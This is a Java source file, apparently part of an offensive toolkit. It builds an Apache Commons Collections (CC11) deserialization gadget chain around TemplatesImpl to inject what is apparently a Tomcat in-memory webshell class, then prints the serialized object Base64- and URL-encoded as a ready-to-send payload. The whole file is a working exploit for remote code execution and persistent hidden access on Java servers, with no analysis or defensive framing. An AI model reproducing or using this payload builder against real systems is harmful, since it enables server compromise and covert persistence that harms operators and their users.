package gadget.cc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import gadget.memshell.*;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.GadgetUtils;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;

public class CC11TomcatMeMShell {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException, CannotCompileException, InstantiationException, NotFoundException {
//        TemplatesImpl templates = GadgetUtils.createTemplatesImpl(TomcatEchoInject.class);
        TemplatesImpl templates = GadgetUtils.createTemplatesImpl(TomcatShellInject2.class);
        InvokerTransformer transformer = new InvokerTransformer("a", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");

        String  payload= Base64.getEncoder().encodeToString(serialize(hashset));


        System.out.println(URLEncoder.encode(payload));


    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream aos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(aos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return aos.toByteArray();
    }

    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        try {
            ByteArrayInputStream ais = new ByteArrayInputStream(bytes);
            ObjectInputStream ois = new ObjectInputStream(ais);
            ois.readObject();
            ois.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
